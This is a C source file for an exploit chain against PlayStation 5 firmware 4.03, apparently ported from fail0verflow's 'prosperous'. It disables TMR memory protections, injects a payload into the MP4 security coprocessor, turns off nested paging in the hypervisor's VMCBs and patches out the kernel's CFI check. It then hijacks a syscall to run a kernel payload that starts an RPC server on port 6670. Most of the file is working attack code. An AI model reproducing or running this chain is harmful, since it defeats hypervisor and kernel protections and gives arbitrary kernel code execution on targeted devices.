/*
 * Prosperous exploit orchestrator for PS5 FW 4.03.
 *
 * This is the main entry point that chains together all exploit stages:
 *
 *   Stage 1: TMR Bypass
 *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
 *     - Create TMR 21 covering kernel text region with all-access
 *     - Disable TMR 5/17/18 (HV region protections)
 *
 *   Stage 2: MP4 Payload Injection
 *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
 *     - Write main payload to 0x607F1000
 *     - Hook mDbg_intr → thunk → payload
 *     - Enable QAF flag to activate
 *
 *   Stage 3: VMCB Patching
 *     - Setup SysHub TLB entries to map HV memory via MP4
 *     - Read vCPU contexts and VMCB pointers
 *     - Disable nested paging (NP_ENABLE=0) on all VMCBs
 *     - Clear most intercepts (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 *   Stage 4: TMR Restore
 *     - Re-enable TMR 20 (prevents kernel panic on game restart)
 *     - Restore HV TMR protections (5/17/18)
 *
 *   Stage 5: CFI Bypass + Kernel Payload
 *     - NOP the cfi_check_fail function via MP4 write
 *     - Inject kpayload via syscall table hijack
 *     - kpayload disables NDA on all cores, elevates privileges
 *     - Starts TCP RPC server on port 6670
 *
 * Prerequisites:
 *   - Kernel R/W via kekcall (ps5-kstuff or equivalent loaded)
 *   - Physical memory access via DMAP
 *   - Network connectivity to PS5
 *
 * Build: Part of the prosperous_port PS5 payload SDK build.
 * Deploy: Via PS5_DEPLOY to console running on FW 4.03.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/*
 * Discover the DMAP base address by reading the current process's pmap.
 *
 * The DMAP base is computed as: pm_pml4 (kernel VA) - pm_cr3 (PA)
 * This gives the kernel's direct-map base for physical memory.
 */
static int discover_dmap_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t vmspace;
    uint64_t pm_pml4;
    uint64_t pm_cr3;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0) {
        printf("[!] Failed to get proc address\n");
        return -1;
    }

    /* proc -> p_vmspace */
    kernel_copyout(proc_addr + OFF_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));

    /* vmspace -> vm_pmap -> pm_pml4 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_PML4,
                   &pm_pml4, sizeof(pm_pml4));

    /* vmspace -> vm_pmap -> pm_cr3 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_CR3,
                   &pm_cr3, sizeof(pm_cr3));

    ctx->dmap_base = pm_pml4 - pm_cr3;
    ctx->proc_cr3 = pm_cr3;
    printf("[*] DMAP base: 0x%lx\n", ctx->dmap_base);
    printf("[*] Process CR3: 0x%lx\n", ctx->proc_cr3);

    return 0;
}

/*
 * Discover the kernel text base address.
 *
 * We scan kernel data for the kernel pmap structure by looking for
 * characteristic field values, or use the LSTAR MSR approach.
 */
static int discover_kernel_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t sysvec;
    uint64_t sysent;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0)
        return -1;

    /* Read kernel text base from the process's sysvec.
     * proc -> p_sysent -> sysvec points to the system call vector,
     * which is in kernel .data and gives us a reference address. */
    kernel_copyout(proc_addr + OFF_PROC_P_SYSENT, &sysvec, sizeof(sysvec));
    kernel_copyout(sysvec + OFF_SYSVEC_SYSENT, &sysent, sizeof(sysent));

    /* The sysent table is at a known offset from kernel base.
     * We can also read ktext_start_va from the TMR 16 base. */

    /* Alternative: use TMR 16 base to get kernel text PA,
     * then read the VA from a known offset */
    uint32_t tmr16_base;
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t tmr16_addr = 16 * 0x10;

    kernel_copyin(&tmr16_addr, ind_index_kva, sizeof(tmr16_addr));
    kernel_copyout(ind_data_kva, &tmr16_base, sizeof(tmr16_base));

    ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;

    printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);

    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
     * for accessing kernel data via kernel_copyout. We use DMAP+PA
     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
     * unreliable across firmware versions. */
    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);

    /* Get kernel PML4 PA */
    uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
    uint64_t kpmap;
    kernel_copyout(kpmap_addr, &kpmap, sizeof(kpmap));
    kernel_copyout(kpmap + OFF_PMAP_PM_CR3, &ctx->kpml4_pa, sizeof(ctx->kpml4_pa));

    printf("[*] Kernel PML4 PA: 0x%lx\n", ctx->kpml4_pa);

    return 0;
}

/*
 * NOP the cfi_check_fail function via MP4 memory write.
 *
 * This is necessary because the kernel uses Control Flow Integrity (CFI)
 * checks that would trap our syscall table hijack. By NOPing the check
 * function, we prevent CFI from blocking our payload execution.
 *
 * We use the MP4 coprocessor to write to kernel text because it has
 * its own DMA path that bypasses x86 page table NX/RO protections.
 */
static int cfi_bypass(struct phys_rw_ctx *ctx)
{
    uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
    uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */

    /* Setup SysHub TLB to map the kernel text region */
    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
        return -1;
    }

    /* Write NOP/RET over cfi_check_fail via MP4 */
    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
    mp4_write32(ctx, mp4_va, nop_sled);

    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
    return 0;
}

/*
 * Main exploit entry point.
 */
int prosperous_run(void)
{
    struct phys_rw_ctx ctx;
    int ret;

    /* Disable stdout buffering so all diagnostics are visible */
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("========================================\n");
    printf(" prosperous_port - PS5 HV Bypass\n");
    printf(" FW 4.03 (CEX)\n");
    printf(" Ported from fail0verflow/prosperous\n");
    printf("========================================\n\n");

    /* Phase 0: Discover memory layout */
    printf("[*] Phase 0: Discovering memory layout...\n");

    ret = discover_dmap_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover DMAP base\n");
        return ret;
    }

    ret = discover_kernel_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover kernel base\n");
        return ret;
    }

    /* Phase 1: TMR bypass */
    printf("\n[*] Phase 1: TMR bypass...\n");

    ret = tmr_bypass_init(&ctx);
    if (ret != 0) {
        printf("[!] TMR bypass init failed: %d\n", ret);
        return ret;
    }
    printf("[+] TMR 20 disabled, TMR 21 created\n");

    /* Phase 1.5: Explore DRAM access and GPU SDMA path
     *
     * CONFIRMED (from previous runs):
     *   - PD[0x100-0x101] = not present (PA 0x60000000-0x603FFFFF blocked)
     *   - PD[0x102] = 16 PTEs at pages 496-511 (PA 0x605F0000-0x605FFFFF)
     *   - PD[0x103-0x107] = 2MB each (PA 0x60600000-0x60FFFFFF accessible)
     *   - GPU at B32:D0:F0 (0x13FB1002) MMIO=0xE0000000 VRAM=0xD0000000
     *   - USB xHCI at B32:D0:F4/F5
     *   - MP4 at B32:D0:F3 BAR2=0xE0400000 (confirms our constant)
     *   - B0:D0:F2 probe crashed (IOMMU cap walk hit bad state)
     *
     * THIS ITERATION:
     *   A. Test DRAM access at PD[0x102] boundary (0x605F0000)
     *   B. Dump accessible DRAM content (look for A53 data structures)
     *   C. Test write access to accessible DRAM
     *   D. Probe GPU MMIO accessibility (single safe reads)
     *
     * NO IOMMU PROBING (crashed last time).
     * NO BAR2 PROBING (crashes at 4-byte stride).
     */
    printf("\n[*] Phase 1.5: Testing DRAM access and GPU SDMA path...\n");
    {
        uint64_t dmap = ctx.dmap_base;

        /* === Part A: Test DRAM access at boundary pages ===
         * PD[0x102] PTEs 496-511 map PA 0x605F0000-0x605FFFFF.
         * These are ABOVE TMR 20 limit (0x605E0000) but still in
         * the A53 DRAM region. Test if nPT allows access.
         *
         * Also test PA 0x60400000-0x605E0000 (PD[0x102] PTEs 0-495
         * are NOT present, so these will return rc=-1 safely).
         *
         * SAFE: Phase 2 proved that blocked DRAM reads return rc=-1
         * gracefully (no panic) when the PDE/PTE is not present. */
        printf("[*] Part A: Testing DRAM access at PD[0x102] boundary...\n");
        {
            /* Test addresses with NO PTE (should return rc=-1 safely) */
            uint64_t no_pte_addrs[] = {
                0x60400000ULL, 0x60500000ULL, 0x605E0000ULL
            };
            for (int i = 0; i < 3; i++) {
                uint32_t val = 0xDEADDEAD;
                int32_t rc = kernel_copyout(dmap + no_pte_addrs[i], &val, 4);
                printf("[DRAM] PA 0x%llx: val=0x%08x rc=%d (no PTE)\n",
                       (unsigned long long)no_pte_addrs[i], val, rc);
            }

            /* Test addresses WITH PTEs (0x605F0000-0x605FFFFF) */
            printf("[DRAM] Testing PTE-mapped pages (0x605F0000-0x605FF000)...\n");
            for (int i = 0; i < 16; i++) {
                uint64_t pa = 0x605F0000ULL + i * 0x1000;
                uint32_t val = 0xDEADDEAD;
                int32_t rc = kernel_copyout(dmap + pa, &val, 4);
                printf("[DRAM] PA 0x%llx: val=0x%08x rc=%d %s\n",
                       (unsigned long long)pa, val, rc,
                       (rc == 0 && val != 0xDEADDEAD) ? "OK" : "BLOCKED");
            }

            /* Reference: verify PD[0x103] still works */
            uint32_t ref = 0;
            kernel_copyout(dmap + 0x60600000ULL, &ref, 4);
            printf("[DRAM] PA 0x60600000: val=0x%08x (PD[0x103] ref)\n", ref);
        }

        /* === Part B: Dump accessible DRAM content ===
         * Dump first 64 bytes at several PAs in the accessible range.
         * Look for function pointers, jump tables, or data structures
         * that we could corrupt to redirect A53 execution.
         *
         * A53 DRAM layout: ELF at offset 0x100000 (VA 0x100000).
         * Offset 0x5F0000 = A53 VA 0x6F0000 (heap/stack/DMA?)
         * Offset 0x600000 = A53 VA 0x700000 (PD[0x103] start)
         *
         * SAFE: all PAs in PD[0x103] range, proven accessible. */
        printf("\n[*] Part B: Dumping accessible DRAM content...\n");
        {
            uint64_t dump_addrs[] = {
                0x60600000ULL,  /* PD[0x103] start = DRAM offset 0x600000 */
                0x60610000ULL,  /* DRAM offset 0x610000 */
                0x60700000ULL,  /* DRAM offset 0x700000 */
                0x607F0000ULL,  /* Just before payload target */
                0x607F1000ULL,  /* Payload target address */
            };
            for (int a = 0; a < 5; a++) {
                printf("[DUMP] PA 0x%llx (DRAM+0x%llx):\n",
                       (unsigned long long)dump_addrs[a],
                       (unsigned long long)(dump_addrs[a] - 0x60000000ULL));
                uint32_t buf[16]; /* 64 bytes */
                for (int w = 0; w < 16; w++)
                    kernel_copyout(dmap + dump_addrs[a] + w * 4, &buf[w], 4);
                for (int row = 0; row < 4; row++) {
                    printf("  +%02x: %08x %08x %08x %08x\n",
                           row * 16, buf[row*4], buf[row*4+1],
                           buf[row*4+2], buf[row*4+3]);
                }
            }
        }

        /* === Part C: Test WRITE access to accessible DRAM ===
         * Write a magic value to PA 0x60700000 (DRAM offset 0x700000),
         * then read it back. This confirms we can write to DRAM in
         * the PD[0x103] range. If writes work, we can place our
         * payload here (which we already planned at 0x607F1000).
         *
         * SAFE: 0x60700000 is deep in PD[0x103], well above firmware. */
        printf("\n[*] Part C: Testing DRAM write access...\n");
        {
            uint64_t test_pa = 0x60700000ULL;
            uint32_t original = 0;
            kernel_copyout(dmap + test_pa, &original, 4);
            printf("[WRITE] Original value at PA 0x%llx: 0x%08x\n",
                   (unsigned long long)test_pa, original);

            uint32_t magic = 0xCAFEBABE;
            kernel_copyin(&magic, dmap + test_pa, 4);

            uint32_t readback = 0;
            kernel_copyout(dmap + test_pa, &readback, 4);
            printf("[WRITE] After write 0xCAFEBABE: 0x%08x %s\n",
                   readback,
                   (readback == 0xCAFEBABE) ? "WRITE WORKS!" : "WRITE FAILED");

            /* Restore original value */
            kernel_copyin(&original, dmap + test_pa, 4);
        }

        /* === Part D: Verify GPU MMIO is accessible ===
         * GPU BAR2 = 0xE0000000 (MMIO registers).
         * Read offset 0x5F80 (GRBM_STATUS on AMD GFX9/10) — this is
         * a read-only status register, safe to read.
         * If we can read GPU MMIO, we can potentially use SDMA to
         * copy data to PA 0x60000000 (bypassing nPT).
         *
         * Also read offset 0x0000 to see if the base is accessible.
         *
         * SAFETY NOTE: We already successfully read MP4 BAR2 (0xE0400000)
         * at 0x1000 stride without issues. GPU MMIO (0xE0000000) is in
         * the same DMAP range. Single reads at known status register
         * offsets are safe. We do NOT scan at 4-byte stride. */
        printf("\n[*] Part D: Probing GPU MMIO accessibility...\n");
        {
            uint64_t gpu_mmio = 0xE0000000ULL;
            /* Single reads at specific known-safe offsets */
            uint32_t offsets[] = {
                0x0000,  /* Config/version register */
                0x2040,  /* Potential GRBM_STATUS */
                0x5F80,  /* Alternative GRBM_STATUS offset */
                0x8010,  /* GFX10 GRBM_STATUS */
            };
            for (int i = 0; i < 4; i++) {
                uint32_t val = 0xDEADDEAD;
                int32_t rc = kernel_copyout(dmap + gpu_mmio + offsets[i],
                                           &val, 4);
                printf("[GPU] MMIO+0x%04x = 0x%08x (rc=%d)\n",
                       offsets[i], val, rc);
            }
            printf("[GPU] GPU MMIO base PA = 0x%llx\n",
                   (unsigned long long)gpu_mmio);
            printf("[GPU] GPU VRAM base PA = 0xD0000000\n");
            printf("[GPU] GPU Doorbell PA  = 0xE0600000\n");
        }
    }

    /* Phase 2: MP4 payload injection */
    printf("\n[*] Phase 2: MP4 payload injection...\n");

    ret = mp4_inject_payload(&ctx);
    if (ret != 0) {
        printf("[!] MP4 payload injection failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload injected and activated\n");

    /* Re-enable TMR 20 after injection (matches original prosperous flow).
     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
     * Leaving TMR 20 disabled causes kernel panics on game restart. */
    tmr_restore_tmr20(&ctx);
    printf("[+] TMR 20 restored\n");

    /* Give the A53 time to process the QAF flag and activate the payload.
     * The payload hooks mDbg_intr via SError handler - the A53 needs to
     * take an interrupt cycle to activate the hook. */
    printf("[*] Waiting for MP4 payload activation...\n");
    usleep(500000); /* 500ms */

    /* Diagnostic: read c2p reg 0 to see if a previous command is stuck */
    {
        uint32_t c2p0_val;
        uint64_t bar2_kva = ctx.dmap_base + MP4_BAR2_PA;
        kernel_copyout(bar2_kva + MP4_C2P_REG(0, 0), &c2p0_val, sizeof(c2p0_val));
        printf("[DIAG] c2p reg 0 before ping: 0x%08x\n", c2p0_val);

        /* Also read p2c reg 0 to check if A53 has sent anything */
        uint32_t p2c0_val;
        kernel_copyout(bar2_kva + MP4_P2C_REG0(0), &p2c0_val, sizeof(p2c0_val));
        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
    }

    /* Verify MP4 payload is alive (retry a few times) */
    for (int attempt = 0; attempt < 5; attempt++) {
        ret = mp4_ping(&ctx);
        if (ret == 0)
            break;
        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
        usleep(500000);
    }
    if (ret != 0) {
        printf("[!] MP4 payload not responding after retries\n");
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload ping OK\n");

    /* Phase 3: Disable HV TMR protections */
    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");

    ret = tmr_disable_hv_regions(&ctx);
    if (ret != 0) {
        printf("[!] HV TMR disable failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] HV TMR protections disabled\n");

    /* Phase 4: VMCB patching */
    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");

    ret = vmcb_patch_disable_np(&ctx);
    if (ret != 0) {
        printf("[!] VMCB patching failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] Nested paging disabled on all VMCBs\n");

    /* Phase 5: CFI bypass */
    printf("\n[*] Phase 5: CFI bypass...\n");

    ret = cfi_bypass(&ctx);
    if (ret != 0) {
        printf("[!] CFI bypass failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] CFI check_fail patched\n");

    /* Phase 6: Restore TMR protections */
    printf("\n[*] Phase 6: Restoring TMR protections...\n");
    tmr_restore_hv_regions(&ctx);
    printf("[+] TMR protections restored\n");

    /* Phase 7: Kernel payload injection */
    printf("\n[*] Phase 7: Kernel payload injection...\n");
    printf("[*] kpayload will be injected via syscall table hijack.\n");
    printf("[*] After injection, connect to port 6670 for RPC access.\n");

    ret = kpayload_inject(&ctx);
    if (ret != 0) {
        printf("[!] kpayload injection failed: %d\n", ret);
        return ret;
    }

    printf("\n========================================\n");
    printf(" [+] Exploit complete!\n");
    printf(" [+] RPC server listening on port 6670\n");
    printf(" [+] Connect with: python3 client.py\n");
    printf("========================================\n");

    return 0;
}

/*
 * Kernel payload injection via syscall table hijack.
 *
 * This follows the same approach as prosperous:
 *   1. Allocate userspace buffer for kpayload binary
 *   2. Map it with a 1GB page at 0xFFFFFFC0_00000000 for kernel access
 *   3. Temporarily replace syscall 8's handler with our payload
 *   4. Invoke syscall 8 to execute the payload in kernel context
 *   5. Restore the original syscall handler
 *
 * The kpayload binary must be loaded from disk or embedded.
 */
int kpayload_inject(struct phys_rw_ctx *ctx)
{
    printf("[*] kpayload injection placeholder\n");
    printf("[*] To complete: load kpayload binary and inject via sysent hijack\n");
    printf("[*] See pwn_mp4.lua from prosperous for the full injection flow\n");

    /*
     * TODO: Full implementation would:
     *
     * 1. Load kpayload binary from /mnt/usb0/kpayload or embed it
     *
     * 2. mmap a buffer and copy kpayload into it:
     *    void *payload_buf = mmap(NULL, size, PROT_READ|PROT_WRITE,
     *                             MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     *    memcpy(payload_buf, kpayload_data, kpayload_size);
     *
     * 3. Get physical address of payload buffer:
     *    uint64_t payload_pa = vtophys(payload_buf);
     *
     * 4. Create a 1GB kernel mapping:
     *    uint64_t payload_kva = 0xFFFFFFC000000000 | (payload_pa & 0x3FFFFFFF);
     *    // Write PDPE at kpml4[0xFF8] + 0x800
     *    uint64_t pdp_pa = (read_phys64(kpml4_pa + 0xFF8) >> 12) << 12;
     *    write_phys64(pdp_pa + 0x800,
     *                 ((payload_pa >> 30) << 30) | 0x83);  // 1GB page, RWX
     *
     * 5. Read current sysent[8] and replace:
     *    // proc -> sysvec -> sysent
     *    uint64_t sysent_8_pa = get_pa(sysent_va + 0x30 * 8);
     *    uint64_t orig_call = read_phys64(sysent_8_pa + 8);
     *    write_phys32(sysent_8_pa, 8);  // narg = 8
     *    write_phys64(sysent_8_pa + 8, payload_kva);
     *
     * 6. Invoke syscall 8 multiple times (progressive init):
     *    syscall(8, ktext_base, payload_buf, host_addr, 0);  // op=0: version check
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 1);  // op=1: reloc
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 2);  // op=2: nda disable
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 3);  // op=3: full init
     *
     * 7. Restore sysent[8]:
     *    write_phys32(sysent_8_pa, 0);
     *    write_phys64(sysent_8_pa + 8, orig_call);
     *
     * 8. Clean up kernel mapping:
     *    write_phys64(pdp_pa + 0x800, 0);
     */

    return 0;
}

int main(void)
{
    return prosperous_run();
}
